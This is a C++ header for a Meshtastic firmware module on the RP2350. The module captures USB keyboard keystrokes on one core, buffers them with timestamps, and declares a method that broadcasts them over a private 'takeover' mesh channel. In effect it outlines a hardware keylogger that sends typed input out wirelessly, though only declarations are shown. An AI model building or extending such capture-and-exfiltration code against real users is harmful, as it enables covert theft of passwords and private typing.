/**
 * @file USBCaptureModule.h
 * @brief USB keyboard capture module for Meshtastic (RP2350 only)
 *
 * This module captures USB keyboard keystrokes using PIO on Core 1 and
 * makes them available to Core 0 via a lock-free queue.
 *
 * SPDX-License-Identifier: GPL-3.0-only
 */

#pragma once

#include "../platform/rp2xx0/usb_capture/keystroke_queue.h"
#include "../platform/rp2xx0/usb_capture/formatted_event_queue.h"
#include "../platform/rp2xx0/usb_capture/common.h"
#include "SinglePortModule.h"
#include "concurrency/OSThread.h"

/**
 * @brief USB Capture Module for RP2350
 *
 * This module:
 * - Initializes USB capture on Core 1
 * - Polls the keystroke queue on Core 0
 * - Logs captured keystrokes for testing
 * - Can be extended to send keystrokes over mesh network
 */
/**
 * @brief Keystroke buffer configuration
 */
#define KEYSTROKE_BUFFER_SIZE     500
#define EPOCH_SIZE                10
#define DELTA_SIZE                2
#define DELTA_MARKER              0xFF
#define DELTA_TOTAL_SIZE          3       /* marker + 2-byte delta */
#define DELTA_MAX_SAFE            65000
#define KEYSTROKE_DATA_START      EPOCH_SIZE
#define KEYSTROKE_DATA_END        (KEYSTROKE_BUFFER_SIZE - EPOCH_SIZE)

class USBCaptureModule : public concurrency::OSThread
{
  public:
    USBCaptureModule();

    /**
     * @brief Initialize the module
     * @return true if initialization successful
     */
    bool init();

  protected:
    /**
     * @brief Main loop - runs on Core 0
     * @return Update interval in milliseconds
     */
    virtual int32_t runOnce() override;

  private:
    keystroke_queue_t *keystroke_queue;
    formatted_event_queue_t *formatted_queue;
    capture_controller_t controller;
    bool core1_started;

    /**
     * @brief Process PSRAM buffers and transmit them
     * Core0's main responsibility - read complete buffers from PSRAM and transmit
     */
    void processPSRAMBuffers();

    /* processFormattedEvents() removed - Core1 now logs directly */

    /**
     * @brief Broadcast buffer data over the private "takeover" channel
     * @param data Pointer to data buffer
     * @param len Length of data to send
     * @return true if packet was queued successfully
     */
    bool broadcastToPrivateChannel(const uint8_t *data, size_t len);
};

extern USBCaptureModule *usbCaptureModule;
